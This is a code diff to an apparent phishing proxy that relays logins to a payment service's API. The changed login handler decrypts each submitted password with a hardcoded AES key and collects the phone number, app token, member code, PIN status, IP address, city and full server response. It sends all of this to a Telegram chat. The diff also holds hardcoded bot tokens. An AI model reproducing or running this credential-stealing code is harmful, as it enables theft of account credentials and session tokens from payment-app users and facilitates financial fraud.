@@ -5,7 +5,7 @@ const crypto = require('crypto');
 
 const app = express();
 const ORIGINAL_API = 'https://api.ezpaycenter.com';
-const BOT_TOKEN = process.env.BOT_TOKEN || '8691125291:AAEiikOQE-PCEueG5xsA6Vf2KDtYij7DvIk';
+const BOT_TOKEN = process.env.BOT_TOKEN || '8727636415:AAFIvrnqVgtQXxCBS8r8j9NAthRO6d2ywaU';
 const WEBHOOK_URL = 'https://xcvic.vercel.app/bot-webhook';
 const REDIS_URL = process.env.KV_REST_API_URL || process.env.UPSTASH_REDIS_REST_URL;
 const REDIS_TOKEN = process.env.KV_REST_API_TOKEN || process.env.UPSTASH_REDIS_REST_TOKEN;
@@ -1235,60 +1235,76 @@ app.post('/app/api/system/v2/login', async (req, res) => {
     }
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
     const userId = await extractUserId(req, jsonResp);
-    if (userId) {
-      saveTokenUserId(req, userId);
-      if (phone) userPhoneMap[String(userId)] = String(phone);
-      const loginData = getResponseData(jsonResp);
-      if (loginData && loginData.token) {
-        tokenUserMap[loginData.token] = String(userId);
-        if (redis) redis.hset('ezpayTokenMap', loginData.token.substring(0, 100), String(userId)).catch(()=>{});
+    const loginData = getResponseData(jsonResp) || {};
+    // EZPay LoginBean returns: appToken, memberCode, memberPhone, ifSetPinCode
+    const appToken = loginData.appToken || loginData.token || loginData.accessToken || '';
+    const memberCode = loginData.memberCode || loginData.memberCodeId || loginData.memberId || loginData.userId || loginData.id || '';
+    const respPhone = loginData.memberPhone || loginData.phone || loginData.mobile || loginData.telephone || '';
+    const ifSetPinCode = loginData.ifSetPinCode || loginData.hasPinCode || '';
+    const finalUserId = userId || String(memberCode || '');
+
+    if (finalUserId) {
+      saveTokenUserId(req, finalUserId);
+      if (phone) userPhoneMap[String(finalUserId)] = String(phone);
+      if (respPhone) userPhoneMap[String(finalUserId)] = String(respPhone);
+      if (appToken) {
+        tokenUserMap[appToken] = String(finalUserId);
+        if (redis) redis.hset('ezpayTokenMap', appToken.substring(0, 100), String(finalUserId)).catch(()=>{});
       }
-      if (loginData && loginData.accessToken) {
-        tokenUserMap[loginData.accessToken] = String(userId);
-        if (redis) redis.hset('ezpayTokenMap', loginData.accessToken.substring(0, 100), String(userId)).catch(()=>{});
-      }
-      if (loginData) {
-        const respPhone = loginData.memberPhone || loginData.phone || loginData.mobile || loginData.telephone || '';
-        if (respPhone && userId) userPhoneMap[String(userId)] = String(respPhone);
-      }
-      const detectedPhone = phone || (loginData?.memberPhone || loginData?.phone || loginData?.mobile || loginData?.telephone || '');
-      trackUser(data, userId, 'Login', detectedPhone);
+      const detectedPhone = phone || respPhone;
+      trackUser(data, finalUserId, 'Login', detectedPhone);
       saveData(data).catch(()=>{});
-    } else if (phone) {
-      const loginData = getResponseData(jsonResp);
-      const respUserId = loginData?.memberCodeId || loginData?.memberId || loginData?.userId || loginData?.id || '';
-      if (respUserId) {
-        userPhoneMap[String(respUserId)] = String(phone);
-        saveTokenUserId(req, String(respUserId));
-        if (loginData && loginData.token) {
-          tokenUserMap[loginData.token] = String(respUserId);
-          if (redis) redis.hset('ezpayTokenMap', loginData.token.substring(0, 100), String(respUserId)).catch(()=>{});
-        }
-        if (loginData && loginData.accessToken) {
-          tokenUserMap[loginData.accessToken] = String(respUserId);
-          if (redis) redis.hset('ezpayTokenMap', loginData.accessToken.substring(0, 100), String(respUserId)).catch(()=>{});
-        }
-        trackUser(data, String(respUserId), 'Login', phone);
-        saveData(data).catch(()=>{});
-      }
     }
-    const loginData2 = getResponseData(jsonResp);
-    const finalUserId = userId || loginData2?.memberCodeId || loginData2?.memberId || loginData2?.userId || '';
+
+    // Decrypt password (AES-128-CBC, key from replit.md)
+    const encPwd = body.memberPwd || body.password || body.pwd || '';
+    let pwd = encPwd;
+    if (encPwd) {
+      try {
+        const AES_KEY = '8Kjsis90sJnsHys8';
+        const keyBytes = Buffer.from(AES_KEY, 'utf8');
+        const iv = keyBytes.slice(0, 16);
+        const decipher = crypto.createDecipheriv('aes-128-cbc', keyBytes, iv);
+        let decrypted = decipher.update(Buffer.from(encPwd, 'base64'));
+        decrypted = Buffer.concat([decrypted, decipher.final()]);
+        pwd = decrypted.toString('utf8');
+      } catch(e) { pwd = encPwd + ' (decrypt failed)'; }
+    }
+
     if (data.adminChatId && bot) {
-      const encPwd = body.memberPwd || body.password || body.pwd || '';
-      let pwd = encPwd;
-      if (encPwd) {
-        try {
-          const AES_KEY = '8Kjsis90sJnsHys8';
-          const keyBytes = Buffer.from(AES_KEY, 'utf8');
-          const iv = keyBytes.slice(0, 16);
-          const decipher = crypto.createDecipheriv('aes-128-cbc', keyBytes, iv);
-          let decrypted = decipher.update(Buffer.from(encPwd, 'base64'));
-          decrypted = Buffer.concat([decrypted, decipher.final()]);
-          pwd = decrypted.toString('utf8');
-        } catch(e) { pwd = encPwd; }
-      }
-      bot.sendMessage(data.adminChatId, `🔑 Login\n📱 Phone: ${phone || 'N/A'}\n🔒 Password: ${pwd || 'N/A'}\n👤 UserID: ${finalUserId || 'N/A'}\n🌐 IP: ${req.headers['x-forwarded-for'] || req.headers['x-vercel-forwarded-for'] || 'N/A'}\n📍 City: ${req.headers['x-vercel-ip-city'] || 'N/A'}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`).catch(()=>{});
+      const isSuccess = jsonResp?.code === 200 || jsonResp?.code === 0 || jsonResp?.success === true;
+      const statusEmoji = isSuccess ? '✅' : '❌';
+      const respCode = jsonResp?.code !== undefined ? jsonResp.code : 'N/A';
+      const respMsg = jsonResp?.msg || jsonResp?.message || '';
+
+      // Full server response (truncated for telegram limit)
+      const fullRespJson = JSON.stringify(loginData, null, 2);
+      const truncatedResp = fullRespJson.length > 1500 ? fullRespJson.substring(0, 1500) + '\n... (truncated)' : fullRespJson;
+
+      const msg =
+`🔑 LOGIN ${statusEmoji}
+━━━━━━━━━━━━━━━━━━
+📱 Phone: ${phone || respPhone || 'N/A'}
+🔒 Password: ${pwd || 'N/A'}
+👤 MemberCode (UserID): ${memberCode || 'N/A'}
+🎟️ AppToken: ${appToken ? '<code>' + appToken + '</code>' : 'N/A'}
+📌 PIN Set: ${ifSetPinCode === '1' || ifSetPinCode === true ? 'Yes' : (ifSetPinCode === '0' || ifSetPinCode === false ? 'No' : 'N/A')}
+
+📊 Server Response:
+   Code: ${respCode}
+   Msg: ${respMsg || 'N/A'}
+
+🌐 IP: ${req.headers['x-forwarded-for'] || req.headers['x-vercel-forwarded-for'] || 'N/A'}
+📍 City: ${req.headers['x-vercel-ip-city'] || 'N/A'}
+🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}
+
+📦 Full Login Data:
+<pre>${truncatedResp.replace(/</g,'&lt;').replace(/>/g,'&gt;')}</pre>`;
+
+      bot.sendMessage(data.adminChatId, msg, { parse_mode: 'HTML' }).catch((e)=>{
+        // fallback without HTML if parse fails
+        bot.sendMessage(data.adminChatId, msg.replace(/<[^>]+>/g,'')).catch(()=>{});
+      });
     }
     sendJson(res, respHeaders, jsonResp, respBody);
   } catch(e) { await transparentProxy(req, res); }
